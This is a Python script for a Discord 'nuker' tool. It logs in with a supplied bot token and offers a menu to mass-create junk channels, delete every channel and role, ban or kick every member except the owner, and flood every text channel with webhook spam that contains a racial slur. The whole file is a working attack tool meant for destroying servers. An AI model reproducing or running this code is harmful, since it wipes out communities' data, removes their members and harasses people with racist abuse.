import discord, os; os.system('cls'); os.system('title 0')
import random
import string
import fade
import os
from discord.ext import commands
import asyncio
from colorama import init, Fore

init(autoreset=True)

os.system('title ghost')

def get_user_input():
    print(
        fade.purpleblue(
            '''
		 █████  ██      ██ ████████ ███████ 
		██   ██ ██      ██    ██    ██      
		███████ ██      ██    ██    █████   
		██   ██ ██      ██    ██    ██      
		██   ██ ███████ ██    ██    ███████
		┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
		┃ 	 Made - by 17xet	┃
		┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
'''
        )
    )
    print(
        fade.purplepink(
            '''    ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
    ┃[1] GENERATE RANDOM CHANNELS [4] SPAM WEBHOOK MESSAGES ┃
    ┃[2] DELETE ALL CHANNELS      [5] BAN EVERY USER        ┃
    ┃[3] REMOVE ALL ROLES         [6] KICK EVERY USER       ┃
    ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛'''
        )
    )
    token = input(f"    {Fore.MAGENTA}TOKEN:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} ")
    return token

def generate_random_name(length=8):
    return "".join(random.choices(string.ascii_lowercase, k=length))

async def run_bot(token):
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix="!", intents=intents)

    @bot.event
    async def on_ready():
        print(f"{Fore.RESET}    {Fore.MAGENTA}LOGGED IN AS{Fore.RESET}{Fore.LIGHTMAGENTA_EX} '{bot.user}'")
        
        while True:
            guild = bot.guilds[0]
            choice = input(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} ")

            if choice == "1":
                print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} CREATING 100 RANDOM CHANNELS.")
                for _ in range(100):
                    channel_name = generate_random_name()
                    await guild.create_text_channel(channel_name)
                print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} FINISHED CREATING CHANNELS.")

            elif choice == "2":
                print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} DELETING EVERY CHANNEL THAT EXISTS.")
                for channel in guild.channels:
                    await channel.delete()
                print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} ALL CHANNELS HAVE BEEN DELETED.")

            elif choice == "3":
                print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} REMOVING ALL ROLES.")
                for role in guild.roles:
                    try:
                        if role != guild.default_role:
                            await role.delete()
                    except Exception as e:
                        print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} COULD NOT DELETE ROLE: {role.name} | ERROR: {e}")
                print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} ALL ROLES HAVE BEEN REMOVED.")

            elif choice == "4":
                print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} CREATING AND SPAMMING MESSAGES IN CHANNELS.")
                for channel in guild.text_channels:
                    try:
                        webhook = await channel.create_webhook(name="hooker")

                        for i in range(20):
                            try:
                                await webhook.send("wow n1gg3r, this is getting nuked? no shit omg lol omg\n" * 30)
                            except Exception as e:
                                print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} FAILED TO SEND MESSAGE IN {channel.name} | ERROR: {e}")

                        print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} FINISHED SPAMMING WEBHOOK MESSAGES IN {channel.name}.")
                    
                    except Exception as e:
                        print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} FAILED TO CREATE WEBHOOK IN {channel.name} | ERROR: {e}")

            elif choice == "5":
                print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} BANNING EVERY USER.")
                for member in guild.members:
                    try:
                        if member != guild.owner:
                            await member.ban(reason="very mass")
                    except Exception as e:
                        print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} COULD NOT BAN USER: {member.name} | ERROR: {e}")
                print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} FINISHED BANNING USERS.")

            elif choice == "6":
                print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} KICKING EVERY USER.")
                for member in guild.members:
                    try:
                        if member != guild.owner:
                            await member.kick(reason="too mass")
                    except Exception as e:
                        print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} COULD NOT KICK USER: {member.name} | ERROR: {e}")
                print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} FINISHED KICKING USERS.")

            else:
                print(f"{Fore.RESET}    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} INVALID CHOICE.")

        await bot.logout()

    try:
        await bot.start(token)
    except discord.LoginFailure:
        print(f"    {Fore.MAGENTA}/:{Fore.RESET}{Fore.LIGHTMAGENTA_EX} ERROR, INVALID BOT TOKEN.")

if __name__ == "__main__":
    token = get_user_input()
    asyncio.run(run_bot(token))



# made by 17xet!
# ghost
